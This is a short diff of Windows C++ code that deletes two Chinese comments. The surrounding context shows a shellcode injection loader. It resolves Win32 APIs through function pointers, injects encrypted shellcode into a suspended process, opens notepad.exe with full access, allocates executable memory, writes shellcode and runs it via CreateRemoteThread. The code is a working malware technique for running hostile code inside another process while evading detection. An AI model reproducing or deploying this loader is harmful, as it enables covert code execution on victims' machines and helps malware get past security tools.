@@ -21,7 +21,7 @@ DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
 
 
 bool InjectShellcodeToNewSuspendedProcess(const wchar_t* exePath, const unsigned char* encrypted_shellcode, size_t shellcode_len, unsigned char key) {
-    // 挂起创建进程并远程线程注入
+    
     typedef BOOL(WINAPI* PFN_CreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
     typedef LPVOID(WINAPI* PFN_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
     typedef BOOL(WINAPI* PFN_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
@@ -86,7 +86,7 @@ int main()
     DWORD pid = GetProcessIdByName(L"notepad.exe");
     HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, 0, pid);
     LPVOID lpBaseAddress = pVirtualAllocEx(hProcess, 0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    // 假设shellcode已定义并解密
+    
     pWriteProcessMemory(hProcess, lpBaseAddress, shellcode, sizeof(shellcode), NULL);
     pCreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0, 0, 0);
 }
